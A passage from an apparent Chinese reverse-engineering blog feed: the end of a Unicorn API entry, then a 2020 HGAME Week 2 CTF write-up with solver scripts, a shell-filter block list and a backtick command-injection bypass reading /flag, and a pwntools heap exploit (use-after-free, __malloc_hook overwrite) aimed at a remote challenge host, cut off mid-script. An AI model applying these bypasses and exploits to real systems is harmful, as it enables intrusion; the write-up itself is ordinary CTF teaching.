class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_context_alloc()</p><h3 id="uc-context-size"><a href="#uc-context-size" class="headerlink" title="uc_context_size"></a>uc_context_size</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> uc_context_size(uc_engine *uc);</span><br></pre></td></tr></table></figure><p>返回存储cpu上下文所需的大小。可以用来分配一个缓冲区来包含cpu上下文，并直接调用uc_context_save。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 存储cpu上下文所需的大小，类型为 size_t.</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> uc_context_size(uc_engine *uc)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> cpu_context_size(uc-&gt;arch, uc-&gt;mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> size_t <span class="title">cpu_context_size</span><span class="params">(uc_arch arch, uc_mode mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (arch) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_M68K:  <span class="keyword">return</span> M68K_REGS_STORAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_X86:   <span class="keyword">return</span> X86_REGS_STORAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:   <span class="keyword">return</span> mode &amp; UC_MODE_BIG_ENDIAN ? ARM_REGS_STORAGE_SIZE_armeb : ARM_REGS_STORAGE_SIZE_arm;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM64: <span class="keyword">return</span> mode &amp; UC_MODE_BIG_ENDIAN ? ARM64_REGS_STORAGE_SIZE_aarch64eb : ARM64_REGS_STORAGE_SIZE_aarch64;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_MIPS:</span><br><span class="line">            <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS64) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS64_REGS_STORAGE_SIZE_mips64;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS64_REGS_STORAGE_SIZE_mips64el;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS_REGS_STORAGE_SIZE_mips;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> MIPS_REGS_STORAGE_SIZE_mipsel;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_SPARC: <span class="keyword">return</span> mode &amp; UC_MODE_SPARC64 ? SPARC64_REGS_STORAGE_SIZE : SPARC_REGS_STORAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_context_alloc()</p><p>From <a href="https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(四">https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(四)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-四&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-四&quot; class=&quot;headerlink&quot; title=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例(四)&quot;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>2020HGAME Week2 WP</title>
    <link href="https://kabeor.github.io/2020HGAME%20Week2%20WP/"/>
    <id>https://kabeor.github.io/2020HGAME Week2 WP/</id>
    <published>2020-02-08T03:47:48.403Z</published>
    <updated>2020-02-08T03:53:41.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020HGAME-Week2-WP"><a href="#2020HGAME-Week2-WP" class="headerlink" title="2020HGAME Week2 WP"></a>2020HGAME Week2 WP</h1><h2 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h2><p>拿到一个elf，upx3.91的壳，一般工具都脱不了，直接ida动态调，到oep之后dump</p><p>IDC dump脚本</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOAD              1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">         <span class="keyword">auto</span> e_phoff;</span><br><span class="line">         <span class="keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">         <span class="keyword">auto</span> i,dumpfile;</span><br><span class="line">         ImageBase=<span class="number">0x400000</span>;</span><br><span class="line">         StartImg=<span class="number">0x400000</span>;</span><br><span class="line">         EndImg=<span class="number">0x0</span>;</span><br><span class="line">         <span class="keyword">if</span> (Dword(ImageBase)==<span class="number">0x7f454c46</span> || Dword(ImageBase)==<span class="number">0x464c457f</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(dumpfile=fopen(<span class="string">"G:\\dumpfile"</span>,<span class="string">"wb"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+Qword(ImageBase+<span class="number">0x20</span>);</span><br><span class="line">      Message(<span class="string">"e_phoff = 0x%x\n"</span>, e_phoff);</span><br><span class="line">      e_phnum=Word(ImageBase+<span class="number">0x38</span>);</span><br><span class="line">      Message(<span class="string">"e_phnum = 0x%x\n"</span>, e_phnum);</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)</span><br><span class="line">                         &#123; </span><br><span class="line">                                 p_offset=Qword(e_phoff+<span class="number">0x8</span>);</span><br><span class="line">                                 StartImg=Qword(e_phoff+<span class="number">0x10</span>);</span><br><span class="line">                                 EndImg=StartImg+Qword(e_phoff+<span class="number">0x28</span>);</span><br><span class="line">                                 Message(<span class="string">"start = 0x%x, end = 0x%x, offset = 0x%x\n"</span>, StartImg, EndImg, p_offset);</span><br><span class="line">                                 dump(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">                                 Message(<span class="string">"dump segment %d ok.\n"</span>,i);</span><br><span class="line">                         &#125;    </span><br><span class="line">         e_phoff=e_phoff+<span class="number">0x38</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,<span class="number">0x3c</span>,<span class="number">0</span>);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      fputc(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      fclose(dumpfile);</span><br><span class="line">        &#125;<span class="keyword">else</span> Message(<span class="string">"dump err."</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">dump</span><span class="params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> i;</span><br><span class="line">        <span class="keyword">auto</span> size;</span><br><span class="line">        size=endimg-startimg;</span><br><span class="line">        fseek(dumpfile,offset,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; size; i=i+<span class="number">1</span> ) </span><br><span class="line">        &#123;</span><br><span class="line">        fputc(Byte(startimg+i),dumpfile);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脱壳之后的逻辑很简单，直接放脚本了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">box= [ <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x80</span>, <span class="number">0x5B</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x41</span>, <span class="number">0x84</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x44</span>, <span class="number">0x82</span>, <span class="number">0x4A</span>, <span class="number">0x85</span>, <span class="number">0x8C</span>, <span class="number">0x82</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>, <span class="number">0x82</span>, <span class="number">0x4D</span>, <span class="number">0x90</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0x54</span>, <span class="number">0x98</span>, <span class="number">0x88</span>, <span class="number">0x96</span>, <span class="number">0x98</span>, <span class="number">0x57</span>, <span class="number">0x95</span>, <span class="number">0x8F</span>, <span class="number">0xA6</span>]</span><br><span class="line">key=list(range(<span class="number">42</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">key[i]=box[i]-i</span><br><span class="line">print(chr(key[i]),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h2><p>C#的exe，dnspy分析发现使用了AES，CBC模式，并且使用base64加密了一下，直接提取出来解就行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode,b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span><span class="params">(text)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(text.encode(<span class="string">'utf‐8'</span>)) % <span class="number">16</span>:</span><br><span class="line">add = <span class="number">16</span> ‐ (len(text.encode(<span class="string">'utf‐8'</span>)) % <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">add = <span class="number">0</span></span><br><span class="line">text = text + (<span class="string">'\0'</span> * add)</span><br><span class="line"><span class="keyword">return</span> text.encode(<span class="string">'utf‐8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text)</span>:</span></span><br><span class="line">key = <span class="string">'Hg4m3_2o20_WeeK2'</span>.encode(<span class="string">'utf‐8'</span>)</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = <span class="string">b'0PuOh9IlX054Icts'</span></span><br><span class="line">text = add_to_16(text)</span><br><span class="line">cryptos = AES.new(key, mode, iv)</span><br><span class="line">cipher_text = cryptos.encrypt(text)</span><br><span class="line"><span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(text, iv)</span>:</span></span><br><span class="line">key = b64decode(<span class="string">b"SGc0bTNfMm8yMF9XZWVLMg=="</span>)</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">cryptos = AES.new(key, mode, iv)</span><br><span class="line">plain_text = cryptos.decrypt(text)</span><br><span class="line"><span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line">data = decrypt(b64decode(<span class="string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span>), b64decode(<span class="string">b"MFB1T2g5SWxYMDU0SWN0cw=="</span>)).decode()</span><br><span class="line">str4 = <span class="string">"Same_ciphertext_"</span></span><br><span class="line">iv = b64decode(<span class="string">b"MFB1T2g5SWxYMDU0SWN0cw=="</span>).decode()</span><br><span class="line">res = []</span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">res.append(ord(data[i]) ^ ord(iv[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">new_iv += chr(res[i] ^ ord(str4[i]))</span><br><span class="line">str2 = b64encode(new_iv.encode(<span class="string">'utf‐8'</span>)).decode()</span><br><span class="line"></span><br><span class="line">destinationArray = b64decode(<span class="string">"dJntSWSPWbWocAq4yjBP5Q=="</span>)</span><br><span class="line">str3 = decrypt(destinationArray, encrypt(str4)).decode()[:‐<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"hgame&#123;"</span>+str2+str3+<span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure><h2 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h2><p>给的是python的字节码</p><p>自己分析了一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> secret <span class="keyword">import</span> flag, encrypt</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: encrypt(flag)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">'7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: dis.dis(encrypt)</span><br><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_FAST                <span class="number">0</span> (OOo)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">              <span class="number">4</span> LOAD_CONST               <span class="number">0</span> (<span class="keyword">None</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">1</span> (<span class="number">-1</span>)</span><br><span class="line">              <span class="number">8</span> BUILD_SLICE              <span class="number">3</span></span><br><span class="line">             <span class="number">10</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">12</span> STORE_FAST               <span class="number">1</span> (flag)     <span class="comment"># flag = OOo[::-1]</span></span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">14</span> LOAD_GLOBAL              <span class="number">0</span> (list)</span><br><span class="line">             <span class="number">16</span> LOAD_FAST                <span class="number">1</span> (flag)</span><br><span class="line">             <span class="number">18</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">20</span> STORE_FAST               <span class="number">2</span> (flag)     <span class="comment"># flag = list(flag)</span></span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">22</span> SETUP_LOOP              <span class="number">50</span> (to <span class="number">74</span>)</span><br><span class="line">             <span class="number">24</span> LOAD_GLOBAL              <span class="number">1</span> (range)</span><br><span class="line">             <span class="number">26</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">28</span> LOAD_GLOBAL              <span class="number">2</span> (len)</span><br><span class="line">             <span class="number">30</span> LOAD_FAST                <span class="number">2</span> (flag)     <span class="comment"># range(1,len(flag))</span></span><br><span class="line">             <span class="number">32</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">34</span> CALL_FUNCTION            <span class="number">2</span></span><br><span class="line">             <span class="number">36</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">38</span> FOR_ITER                <span class="number">32</span> (to <span class="number">72</span>)   <span class="comment"># for i in range(1,len(flag))</span></span><br><span class="line">             <span class="number">40</span> STORE_FAST               <span class="number">3</span> (i)      <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">  <span class="number">7</span>          <span class="number">42</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">44</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">46</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">48</span> BINARY_SUBTRACT</span><br><span class="line">             <span class="number">50</span> BINARY_SUBSCR                        <span class="comment"># flag[i-1]</span></span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">54</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">56</span> BINARY_SUBSCR                        <span class="comment"># flag[i]</span></span><br><span class="line">             <span class="number">58</span> BINARY_XOR</span><br><span class="line">             <span class="number">60</span> STORE_FAST               <span class="number">4</span> (Oo)      <span class="comment"># Oo = flag[i-1] ^ flag[i]</span></span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">62</span> LOAD_FAST                <span class="number">4</span> (Oo)</span><br><span class="line">             <span class="number">64</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">68</span> STORE_SUBSCR                         <span class="comment"># flag[i] = Oo</span></span><br><span class="line">             <span class="number">70</span> JUMP_ABSOLUTE           <span class="number">38</span></span><br><span class="line">        &gt;&gt;   <span class="number">72</span> POP_BLOCK</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>     &gt;&gt;   <span class="number">74</span> LOAD_GLOBAL              <span class="number">3</span> (bytes)</span><br><span class="line">             <span class="number">76</span> LOAD_FAST                <span class="number">2</span> (flag)</span><br><span class="line">             <span class="number">78</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">80</span> STORE_FAST               <span class="number">5</span> (O)       <span class="comment"># O = bytes(flag)</span></span><br><span class="line"></span><br><span class="line"> <span class="number">10</span>          <span class="number">82</span> LOAD_FAST                <span class="number">5</span> (O)</span><br><span class="line">             <span class="number">84</span> LOAD_METHOD              <span class="number">4</span> (hex)     <span class="comment"># hex(O)</span></span><br><span class="line">             <span class="number">86</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">             <span class="number">88</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: exit()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">"sfesefsfhthfyhjjus"</span></span><br><span class="line">O0o = list(flag)</span><br><span class="line">out_flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(O0o)):</span><br><span class="line">O0 = i</span><br><span class="line">Oo = ord(O0o[O0<span class="number">-1</span>])^ord(O0o[O0])</span><br><span class="line">O0o [O0] = Oo</span><br></pre></td></tr></table></figure><p>逆向即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = <span class="string">"7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22"</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(q),<span class="number">2</span>):</span><br><span class="line">    flag.append(int(q[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">flags = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">flag = flag[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)<span class="number">-1</span>):</span><br><span class="line">    flag[i] = flag[i+<span class="number">1</span>]^flag[i]</span><br><span class="line">    flags += chr(flag[i])</span><br><span class="line">flags += chr(<span class="number">0x7d</span>)</span><br><span class="line"><span class="keyword">print</span> flags</span><br></pre></td></tr></table></figure><h2 id="findyourself"><a href="#findyourself" class="headerlink" title="findyourself"></a>findyourself</h2><p>有两个check</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">check1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">   &#123;</span><br><span class="line"> <span class="keyword">if</span> ( (a1[i] &lt;= <span class="number">96</span> || a1[i] &gt; <span class="number">122</span>) &amp;&amp; (a1[i] &lt;= <span class="number">64</span> || a1[i] &gt; <span class="number">90</span>) &amp;&amp; a1[i] != <span class="number">47</span> &amp;&amp; a1[i] != <span class="number">32</span> &amp;&amp; a1[i] != <span class="number">45</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"sh"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"cat"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"flag"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"pwd"</span>) || <span class="built_in">strstr</span>(a1, <span class="string">"export"</span>) )</span><br><span class="line">  result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">result = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">check2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="number">42</span>)</span><br><span class="line">|| <span class="built_in">strstr</span>(a1, <span class="string">"sh"</span>)|| <span class="built_in">strstr</span>(a1, <span class="string">"cat"</span>)|| <span class="built_in">strstr</span>(a1, <span class="string">".."</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">38</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">124</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">62</span>)|| <span class="built_in">strchr</span>(a1, <span class="number">60</span>) )  &#123;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">else</span>  &#123;</span><br><span class="line">      result = <span class="number">0L</span>L;  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了常用的查看命令</p><p>思路是将flag读出作为新文件的文件名</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cat /flag&gt;/tmp/`cat /flag`</span><br></pre></td></tr></table></figure><h2 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h2><p>存在UAF</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index?"</span>);</span><br><span class="line">  v1 = readi(<span class="string">"index?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">list</span>[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">list</span>[v1]);    &lt;============</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是泄露libc修改__malloc_hook到one_gadget</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'47.103.214.163'</span>,<span class="number">21002</span>)</span><br><span class="line"><span class="comment">#io = process('./Roc826')</span></span><br><span class="line"><span class="comment">#elf = ELF(EXEC_FILE)</span></span><br><span class="line">libc = ELF(REMOTE_LIBC)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'?'</span>,str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span> </span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="string">'2'</span>) </span><br><span class="line">   io.sendlineafter(<span class="string">'?'</span>,str(idx))</span><br><span class="line">add(<span class="number">0x89</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">unsorted_bin = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line"><span class="keyword">print</span> hex(unsorted_bin)</span><br><span class="line">libc_addr = unsorted_bin - <span class="number">3951392</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line"></span><br><span class="line">__malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'c'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'d'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'e'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p64(__malloc_hook<span class="number">-35</span>)*<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">add(<span 